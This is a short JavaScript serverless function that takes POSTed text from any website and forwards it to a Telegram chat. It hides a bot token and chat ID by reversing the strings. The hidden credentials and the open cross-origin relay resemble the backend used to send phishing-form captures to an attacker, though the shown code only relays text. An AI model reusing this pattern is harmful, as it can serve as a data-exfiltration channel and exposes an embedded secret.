const _tk = 'A6zZoEm1kjOTa8BXXUinpfA-wtsBdiGEEAA:8967747678'.split('').reverse().join('');
const _ci = '4539992728'.split('').reverse().join('');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });

  let body = '';
  for await (const chunk of req) body += chunk;
  const p = new URLSearchParams(body);
  const text = p.get('text') || '';
  if (!text) return res.status(400).json({ error: 'text required' });

  try {
    const url = 'https://api.telegram.org/bot' + _tk + '/sendMessage';
    const tgBody = 'chat_id=' + encodeURIComponent(_ci) + '&text=' + encodeURIComponent(text) + '&parse_mode=HTML';
    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: tgBody });
    return res.json({ success: true });
  } catch (err) {
    return res.json({ success: false, error: err.message });
  }
};
